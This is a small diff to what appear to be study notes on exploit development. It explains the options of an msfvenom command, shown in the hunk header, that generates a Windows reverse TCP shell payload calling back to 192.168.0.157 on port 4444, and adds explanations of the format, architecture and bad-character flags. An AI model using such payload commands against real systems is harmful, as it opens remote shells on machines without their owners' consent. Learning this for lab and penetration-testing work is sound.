@@ -7,3 +7,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.157 LPORT=4444 EXITFUNC=th
 **LHOST:** the IP in which the target is gonna connect back to
 **LPORT:** the port in which target will connect back to
 **EXITFUNC:** Makes connection more stable
+**-f:** for file type in this case C
+**-a:** for architecture, could be x64 or x86
+**-b:** for bad characters
+
